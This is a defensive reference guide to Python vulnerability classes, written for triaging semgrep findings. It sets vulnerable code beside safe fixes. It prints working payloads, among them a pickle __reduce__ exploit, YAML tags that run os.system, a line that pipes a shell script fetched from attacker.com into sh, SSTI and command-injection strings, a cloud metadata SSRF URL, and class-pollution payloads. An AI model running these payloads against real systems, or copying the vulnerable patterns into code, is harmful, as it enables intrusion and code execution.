# Python-Specific Vulnerabilities

Reference guide for Python security patterns when reviewing semgrep findings.

## Path Traversal: os.path.join() and pathlib.PurePath.joinpath() Absolute Path Bypass

### The Vulnerability

Python's `os.path.join()` and `pathlib.PurePath.joinpath()` discard all preceding path components when they encounter an absolute path:

```python
os.path.join("/safe/uploads", user_input)
                              ^^^^^^^^^^
If user_input = "/etc/passwd"
Result = "/etc/passwd"  # NOT "/safe/uploads/etc/passwd"

# Same behavior with pathlib
PurePath("/safe/uploads").joinpath(user_input)  # Returns PurePath("/etc/passwd")
Path("/safe/uploads") / user_input              # Returns Path("/etc/passwd")
```

### Attack Pattern (Arbitrary File Read)

1. Application uses `os.path.join()` or pathlib to build paths from user input
2. Attacker provides path starting with `/`: `/etc/passwd`
3. Base directory is completely discarded
4. Attacker reads/writes files outside intended directory

### Vulnerable Code Patterns

```python
# VULNERABLE: Direct user input as later argument
filename = request.args.get("file")
path = os.path.join(UPLOAD_DIR, filename)
return send_file(path)

# VULNERABLE: File upload with unsanitized filename
f = request.files["document"]
save_path = os.path.join(UPLOAD_DIR, f.filename)
f.save(save_path)

# VULNERABLE: Pathlib Path (concrete class) - same behavior
user_file = request.args.get("name")
path = Path("/data") / user_file  # user_file="/etc/passwd" → Path("/etc/passwd")

# VULNERABLE: Pathlib PurePath (abstract base class) - same behavior
path = PurePath("/data").joinpath(user_file)

# VULNERABLE: PurePosixPath and PureWindowsPath - same behavior
path = PurePosixPath("/data").joinpath(user_file)
path = PureWindowsPath("C:\\data").joinpath(user_file)  # C:\etc\passwd on Windows

# VULNERABLE: Multiple user inputs - any can be absolute
path = os.path.join("/base", subdir, filename)  # Either can override
```

### Safe Patterns

```python
# SAFE: os.path.basename strips directory components
filename = request.args.get("file")
safe_name = os.path.basename(filename)  # "/etc/passwd" → "passwd"
path = os.path.join(UPLOAD_DIR, safe_name)

# SAFE: werkzeug secure_filename for uploads
from werkzeug.utils import secure_filename
f = request.files["document"]
safe_name = secure_filename(f.filename)
save_path = os.path.join(UPLOAD_DIR, safe_name)

# SAFE: Strip leading slashes
filename = request.args.get("file")
clean_name = filename.lstrip("/")
path = os.path.join(UPLOAD_DIR, clean_name)

# SAFE: Validate resolved path is within base
import os.path
base = os.path.realpath(UPLOAD_DIR)
full = os.path.realpath(os.path.join(UPLOAD_DIR, user_input))
if not full.startswith(base + os.sep):
    raise ValueError("Path traversal detected")
```

### Custom Semgrep Rule

We have `custom-rules/custom/novel-vulns/python-path-join-absolute-bypass.yaml` to detect these patterns.

### References

- https://docs.python.org/3/library/os.path.html#os.path.join
- https://docs.python.org/3/library/pathlib.html#pathlib.PurePath.joinpath
- https://cwe.mitre.org/data/definitions/22.html
- YesWeHack Training - Path Traversal module

---

## Pickle Deserialization RCE

### The Vulnerability

`pickle.loads()` on untrusted data allows arbitrary code execution:

```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Exploit())
# Deserializing this runs os.system('id')
```

### Dangerous Patterns

```python
# CRITICAL: Direct user input
data = pickle.loads(request.data)

# CRITICAL: Base64 doesn't help
data = pickle.loads(base64.b64decode(request.form['data']))

# CRITICAL: From file upload
with open(uploaded_file, 'rb') as f:
    data = pickle.load(f)

# CRITICAL: From Redis/cache (if attacker can poison)
data = pickle.loads(redis.get('user_session'))
```

### ML/Data Science Pickle Patterns (Often Missed)

Many ML libraries use pickle internally - these are high-value targets:

```python
# CRITICAL: PyTorch model loading (uses pickle)
import torch
model = torch.load(uploaded_model)  # RCE if model is attacker-controlled
# SAFE: torch.load("model.pt", weights_only=True)  # PyTorch 1.13+

# CRITICAL: joblib (sklearn model persistence)
import joblib
clf = joblib.load(user_uploaded_file)  # .pkl, .joblib files

# CRITICAL: NumPy with pickle enabled
import numpy as np
data = np.load("data.npy", allow_pickle=True)  # RCE if file is malicious

# CRITICAL: pandas read_pickle
import pandas as pd
df = pd.read_pickle(user_file)  # Direct pickle deserialization

# DANGEROUS: Keras/TensorFlow model loading (Lambda layers use pickle)
from keras.models import load_model
model = load_model(uploaded_model)  # Can execute code in Lambda layers

# DANGEROUS: Hugging Face (some models contain pickle)
model = AutoModel.from_pretrained(untrusted_path)  # Prefer safetensors format
```

### Import Alias Evasion

Watch for direct imports that bypass `pickle.` prefix detection:

```python
# These evade simple "pickle.loads" pattern matching
from pickle import loads
from pickle import load, loads
from _pickle import loads

# Then used without module prefix
data = loads(user_input)  # Still vulnerable!
```

### Safe Alternatives

```python
# SAFE: JSON for data serialization
import json
data = json.loads(request.data)

# SAFE: If pickle required, HMAC sign and verify
import hmac
signature = hmac.new(SECRET_KEY, data, 'sha256').hexdigest()
if not hmac.compare_digest(signature, provided_sig):
    raise ValueError("Invalid signature")

# SAFER: Use restricted unpickler (still risky)
import pickle
import io

class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        raise pickle.UnpicklingError("Forbidden")

# ML-SPECIFIC SAFE PATTERNS:
# PyTorch: weights_only=True (1.13+)
model = torch.load("model.pt", weights_only=True)

# NumPy: Default is allow_pickle=False (safe)
data = np.load("data.npy")  # Fails if file contains pickle

# Use safer formats for model interchange:
# - ONNX for ML models
# - Safetensors for Hugging Face
# - Parquet/CSV for pandas data
```

### Custom Semgrep Rules

We have comprehensive coverage in:
- `custom-rules/custom/novel-vulns/python-pickle-ml-deserialization.yaml` - ML/data science patterns
- `custom-rules/web-vulns/deserialization-taint.yaml` - Taint tracking from web inputs

---

## YAML Deserialization RCE

### The Vulnerability

Python's `yaml.load()` without a safe Loader allows arbitrary code execution via YAML tags:

```python
import yaml

# VULNERABLE: No Loader specified (defaults to unsafe in PyYAML < 5.1)
data = yaml.load(user_input)

# Attack payload:
# !!python/object/apply:os.system ['id']
# !!python/object/apply:subprocess.check_output [['cat', '/etc/passwd']]
```

### How It Works

YAML supports object serialization via type tags. PyYAML's default/unsafe loaders process these tags and instantiate Python objects:

```yaml
# Execute os.system('id')
!!python/object/apply:os.system ['id']

# Execute subprocess with arguments
!!python/object/apply:subprocess.check_output
  args: [['cat', '/etc/passwd']]

# Import and call arbitrary module function
!!python/object/apply:builtins.eval ['__import__("os").system("id")']

# More stealthy - tuple unpacking trick
!!python/object/new:tuple
- !!python/object/apply:os.system ['curl attacker.com/shell.sh | sh']
```

### Dangerous Patterns

```python
# CRITICAL: No Loader argument (PyYAML < 5.1 default is unsafe)
data = yaml.load(request.data)
for doc in yaml.load_all(config_file):
    process(doc)

# CRITICAL: Explicitly unsafe loaders
yaml.load(data, Loader=yaml.Loader)         # Unsafe
yaml.load(data, Loader=yaml.UnsafeLoader)   # Explicitly unsafe
yaml.load(data, Loader=yaml.FullLoader)     # Allows some dangerous constructs
yaml.load(data, Loader=yaml.CLoader)        # C-accelerated unsafe loader

# CRITICAL: Explicit unsafe_load function
yaml.unsafe_load(user_input)
yaml.unsafe_load_all(config_stream)

# DANGEROUS: Config files from user upload
with open(uploaded_file) as f:
    config = yaml.load(f)

# DANGEROUS: YAML from external API/webhook
response = requests.get(external_url)
data = yaml.load(response.text)
```

### Safe Patterns

```python
# SAFE: Use safe_load (only allows basic types)
data = yaml.safe_load(user_input)
for doc in yaml.safe_load_all(config_file):
    process(doc)

# SAFE: Explicit SafeLoader
data = yaml.load(user_input, Loader=yaml.SafeLoader)
data = yaml.load(user_input, Loader=yaml.CSafeLoader)  # C-accelerated safe

# SAFE: BaseLoader (strings only, no type coercion)
data = yaml.load(user_input, Loader=yaml.BaseLoader)

# ALTERNATIVE: Use JSON for untrusted data
import json
data = json.loads(user_input)
```

### Version Notes

| PyYAML Version | `yaml.load(data)` Default Behavior |
|----------------|-----------------------------------|
| < 5.1 | Uses unsafe Loader (RCE possible) |
| >= 5.1 | Warning, still uses FullLoader (some RCE) |
| >= 6.0 | Requires explicit Loader argument |

### Custom Semgrep Rule

We have `custom-rules/custom/novel-vulns/python-unsafe-yaml-load.yaml` with three rules:
- `python-yaml-load-no-loader`: Catches `yaml.load()` without Loader argument
- `python-yaml-load-unsafe-loader`: Catches explicit unsafe Loaders
- `python-yaml-unsafe-load-function`: Catches `yaml.unsafe_load()`

### References

- https://pyyaml.org/wiki/PyYAMLDocumentation
- https://blog.rubygems.org/2013/01/31/data-verification.html
- https://cwe.mitre.org/data/definitions/502.html

---

## Class Pollution (Python's Prototype Pollution)

### The Vulnerability

Similar to JavaScript's Prototype Pollution, Python's mutable class attributes allow "class pollution" attacks. When untrusted input can modify object attributes via `setattr()`, recursive merge functions, or deserialization, attackers can:

- Overwrite global variables via `__init__.__globals__`
- Modify class behavior affecting all instances
- Escalate to RCE via `__reduce__`, `__getattr__`, etc.

```python
some_var = "change me!"

class Dummy:
    def __init__(self):
        pass

def merge(source, destination):
    for key, value in source.items():
        if hasattr(destination, key) and type(value) == dict:
            merge(value, getattr(destination, key))
        else:
            setattr(destination, key, value)

# Attack payload traverses __init__.__globals__ to pollute globals
payload = {
    "__init__": {
        "__globals__": {
            "some_var": "polluted"
        }
    }
}

merge(payload, Dummy())
print(some_var)  # Output: "polluted"
```

### How It Works

1. Attacker provides nested dict with dunder attribute keys (`__init__`, `__globals__`)
2. Recursive merge function uses `getattr()` to traverse object attributes
3. `setattr()` writes attacker-controlled values to class/global namespaces
4. All instances and global scope are affected

### Attack Vectors

| Vector | Payload Structure | Impact |
|--------|-------------------|--------|
| Global pollution | `{"__init__": {"__globals__": {"var": "x"}}}` | Modify global variables |
| Class attr pollution | `{"__class__": {"attr": "x"}}` | Affect all class instances |
| Method override | `{"method_name": <callable>}` | Replace instance methods |
| RCE via reduce | Combine with pickle gadgets | Code execution |

### Dangerous Patterns

```python
# CRITICAL: Recursive merge with setattr (most common)
def merge(src, dst):
    for key, value in src.items():
        if hasattr(dst, key) and isinstance(value, dict):
            merge(value, getattr(dst, key))
        else:
            setattr(dst, key, value)  # Attacker controls key!

# CRITICAL: User input flows to setattr
data = request.json  # Attacker-controlled
for key, value in data.items():
    setattr(user_settings, key, value)

# CRITICAL: __dict__ update from user input
obj.__dict__.update(request.json)  # Mass assignment
vars(obj).update(user_data)

# DANGEROUS: json.loads with setattr in object_hook
def dict_to_obj(d):
    obj = DataObject()
    for k, v in d.items():
        setattr(obj, k, v)  # Pollution vector
    return obj
json.loads(data, object_hook=dict_to_obj)

# DANGEROUS: Direct dunder setattr
setattr(obj, "__class__", MaliciousClass)
setattr(obj, "__init__", evil_init)
```

### Real-World Exploitation

```python
# Example: Flask app with vulnerable settings merge
@app.route('/api/settings', methods=['POST'])
def update_settings():
    data = request.json
    merge(data, current_user.settings)  # VULNERABLE
    return jsonify({"status": "ok"})

# Attack payload to override Flask secret key:
{
    "__init__": {
        "__globals__": {
            "app": {
                "secret_key": "attacker_controlled_key"
            }
        }
    }
}

# Or to enable debug mode:
{
    "__init__": {
        "__globals__": {
            "app": {
                "debug": true
            }
        }
    }
}
```

### Safe Patterns

```python
# SAFE: Explicit allowlist for attribute names
ALLOWED_ATTRS = {'theme', 'language', 'timezone'}

def safe_merge(src, dst):
    for key, value in src.items():
        if key in ALLOWED_ATTRS:  # Allowlist check
            setattr(dst, key, value)

# SAFE: Block dunder attributes
BLOCKED_PREFIXES = ('__', '_')

def safe_setattr(obj, key, value):
    if key.startswith(BLOCKED_PREFIXES):
        raise ValueError(f"Forbidden attribute: {key}")
    setattr(obj, key, value)

# SAFE: Use dataclasses or Pydantic with strict validation
from pydantic import BaseModel

class UserSettings(BaseModel):
    theme: str
    language: str

    class Config:
        extra = "forbid"  # Reject unknown fields

# SAFE: Shallow update only (no recursive traversal)
def shallow_update(src, dst):
    for key, value in src.items():
        if key in dst.__dict__ and not key.startswith('_'):
            dst.__dict__[key] = value  # No recursion, no dunders
```

### Detection Tips

When reviewing semgrep findings for class pollution:

1. **Look for recursive functions** that use both `getattr()` and `setattr()`
2. **Trace data flow** from user input (request.json, form data) to setattr
3. **Check for dict iteration** over user-controlled data with setattr in body
4. **Identify merge/update helpers** - common names: `merge`, `deep_merge`, `update_obj`, `dict_to_object`
5. **Watch for Pydantic `extra="allow"`** which accepts arbitrary fields

### Custom Semgrep Rules

We have comprehensive coverage in:
- `custom-rules/custom/novel-vulns/python-class-pollution.yaml`

Rules included:
| Rule ID | Confidence | Pattern |
|---------|------------|---------|
| `python-class-pollution-setattr-taint` | HIGH | Taint: user input → setattr |
| `python-class-pollution-recursive-merge` | HIGH | Recursive merge with getattr/setattr |
| `python-class-pollution-globals-access` | HIGH | Direct `__init__.__globals__` access |
| `python-class-pollution-class-manipulation` | MEDIUM | `__class__` or `__bases__` modification |
| `python-class-pollution-dunder-setattr` | MEDIUM | setattr with dunder names |
| `python-class-pollution-dict-merge` | MEDIUM | Dict iteration with setattr |
| `python-class-pollution-dict-update` | MEDIUM | `__dict__.update()` from user data |

### References

- https://blog.abdulrah33m.com/prototype-pollution-in-python/
- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.html
- CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes

---

## SSTI: Template Injection

### The Vulnerability

Jinja2, Mako, and other template engines can execute code when user input is rendered as a template:

```python
# VULNERABLE: User input in template string
from jinja2 import Template
Template(user_input).render()

# Payload: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### Dangerous Patterns

```python
# CRITICAL: Template from user input
template = Template(request.form['template'])
return template.render()

# CRITICAL: Format string with user control
template = request.args.get('msg')
return template.format(**data)  # {data.__class__.__mro__[1].__subclasses__()}

# CRITICAL: f-string with eval
eval(f"f'{user_input}'")  # Rare but seen
```

### Safe Patterns

```python
# SAFE: User input only in template variables
from jinja2 import Template
template = Template("Hello {{ name }}!")  # Hardcoded template
return template.render(name=user_input)   # User data as variable

# SAFE: Sandbox mode (limited protection)
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment()
template = env.from_string(user_input)

# SAFEST: Don't render user input as template
```

---

## eval/exec Code Injection

### The Vulnerability

`eval()` and `exec()` execute arbitrary Python code:

```python
# CRITICAL: Direct user input
result = eval(request.args.get('expr'))

# Payload: __import__('os').system('id')
```

### Dangerous Patterns

```python
# CRITICAL: Math expression evaluator
expr = request.args.get('calculation')
result = eval(expr)

# CRITICAL: Dynamic attribute access
attr = request.args.get('field')
value = eval(f"obj.{attr}")

# DANGEROUS: Even with "restrictions"
eval(user_input, {"__builtins__": {}})  # Bypassable!
```

### Safe Alternatives

```python
# SAFE: ast.literal_eval for data structures
import ast
data = ast.literal_eval(user_input)  # Only literals: dicts, lists, strings, numbers

# SAFE: Explicit whitelist for math
import operator
SAFE_OPS = {'+': operator.add, '-': operator.sub, '*': operator.mul}
# Parse and evaluate manually

# SAFE: numexpr for numerical expressions
import numexpr
result = numexpr.evaluate(expr)  # Limited to numerical operations
```

---

## Command Injection

### The Vulnerability

Subprocess with shell=True or os.system allows command injection:

```python
# VULNERABLE: shell=True with user input
subprocess.call(f"ls {user_dir}", shell=True)

# Payload: user_dir = "; cat /etc/passwd"
```

### Dangerous Patterns

```python
# CRITICAL: os.system
os.system(f"convert {input_file} {output_file}")

# CRITICAL: shell=True
subprocess.Popen(f"grep {pattern} {file}", shell=True)

# CRITICAL: Backtick-style execution
os.popen(f"wc -l {filename}")
```

### Safe Patterns

```python
# SAFE: List arguments without shell
subprocess.run(["ls", user_dir])  # No shell interpretation

# SAFE: shlex.quote for unavoidable shell usage
import shlex
subprocess.run(f"ls {shlex.quote(user_dir)}", shell=True)

# SAFEST: Avoid subprocess for common operations
import os
files = os.listdir(user_dir)  # Instead of: ls {user_dir}
```

---

## SSRF Vulnerabilities

### The Vulnerability

User-controlled URLs can target internal services:

```python
# VULNERABLE: Direct fetch of user URL
url = request.args.get('url')
response = requests.get(url)

# Payload: url = "http://169.254.169.254/latest/meta-data/"  # AWS metadata
```

### Dangerous Patterns

```python
# CRITICAL: Direct URL fetch
requests.get(user_url)
urllib.request.urlopen(user_url)

# CRITICAL: Webhook/callback URLs
requests.post(user_callback_url, json=data)

# DANGEROUS: PDF generators, image processors
weasyprint.HTML(url=user_url).write_pdf()
```

### Safe Patterns

```python
# SAFE: URL validation
from urllib.parse import urlparse
parsed = urlparse(user_url)
if parsed.scheme not in ('http', 'https'):
    raise ValueError("Invalid scheme")
if parsed.hostname in BLOCKED_HOSTS:
    raise ValueError("Blocked host")

# SAFER: DNS resolution check
import socket
ip = socket.gethostbyname(parsed.hostname)
if ipaddress.ip_address(ip).is_private:
    raise ValueError("Private IP blocked")

# SAFEST: Allowlist of permitted domains
if parsed.hostname not in ALLOWED_DOMAINS:
    raise ValueError("Domain not allowed")
```

---

## SQL Injection

### The Vulnerability

String concatenation in SQL queries allows injection:

```python
# VULNERABLE: String formatting
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")

# VULNERABLE: % formatting
cursor.execute("SELECT * FROM users WHERE name = '%s'" % name)
```

### Safe Patterns

```python
# SAFE: Parameterized queries
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))

# SAFE: ORM (SQLAlchemy, Django ORM)
User.query.filter_by(id=user_id).first()
```

---

## Dynamic Import LFI (CWE-98)

### The Vulnerability

Python's `importlib.import_module()`, `__import__()`, and `importlib.util` can be exploited when user input controls the module path:

```python
# VULNERABLE: User controls module name
from flask import request
import importlib

@app.route('/plugin/<name>')
def load_plugin(name):
    plugin = importlib.import_module(f'plugins.{name}')  # LFI!
    return plugin.run()

# Attack: /plugin/os → imports os module
# Combined with getattr() → RCE
```

### Dangerous Patterns

```python
# CRITICAL: Direct module name from user
module = importlib.import_module(request.args.get('name'))

# CRITICAL: f-string/concat with user input
module = importlib.import_module(f'plugins.{user_input}')
module = importlib.import_module('myapp.' + user_input)

# CRITICAL: __import__ with user input
module = __import__(request.json.get('module'))

# CRITICAL: importlib.util functions
spec = importlib.util.find_spec(user_input)

# CRITICAL: Flask route parameters
@app.route('/theme/<theme_name>')
def set_theme(theme_name):
    theme = importlib.import_module(f'themes.{theme_name}')
```

### Safe Patterns

```python
# SAFE: Explicit allowlist
ALLOWED_PLUGINS = {'analytics', 'export', 'notifications'}

def load_plugin(name):
    if name not in ALLOWED_PLUGINS:
        raise ValueError(f"Unknown plugin: {name}")
    return importlib.import_module(f'plugins.{name}')

# SAFE: Registry pattern
PLUGIN_REGISTRY = {
    'analytics': 'myapp.plugins.analytics',
    'export': 'myapp.plugins.export',
}

def load_plugin(name):
    if name not in PLUGIN_REGISTRY:
        raise ValueError(f"Unknown plugin: {name}")
    return importlib.import_module(PLUGIN_REGISTRY[name])
```

### Custom Semgrep Rules

We have comprehensive coverage in `custom-rules/web-vulns/python-dynamic-import-lfi.yaml`:
- `python-dynamic-import-lfi`: Taint tracking for Flask/Django sources to import sinks
- `python-dynamic-import-lfi-fstring`: Pattern-based for f-string, %, find_spec patterns
- `python-dynamic-import-lfi-concat`: String concatenation and .format() patterns
- `python-dynamic-import-lfi-route-param`: Flask route parameters to imports
- `python-dynamic-import-lfi-exec`: User input to exec/eval/compile

---

## Checklist for Python Code Review

When reviewing Python semgrep findings:

- [ ] **Path traversal**: Check for `os.path.join()`, `pathlib.Path`, or `pathlib.PurePath` with user input
- [ ] **Pickle deserialization**: Any `pickle.loads()` on user input is critical
- [ ] **ML pickle patterns**: `torch.load()`, `joblib.load()`, `np.load(allow_pickle=True)`, `pd.read_pickle()`
- [ ] **YAML deserialization**: `yaml.load()` without SafeLoader, or `yaml.unsafe_load()`
- [ ] **Class pollution**: Recursive merge with `setattr()`, `__dict__.update()` from user input
- [ ] **Dynamic import LFI**: `importlib.import_module()`, `__import__()` with user-controlled module names
- [ ] **SSTI**: User input rendered as Jinja2/Mako template string
- [ ] **Code injection**: `eval()`, `exec()`, or `compile()` with user input
- [ ] **Command injection**: `shell=True` or `os.system()` with user data
- [ ] **SSRF**: URL fetching without validation (requests, urllib)
- [ ] **SQL injection**: String formatting in database queries
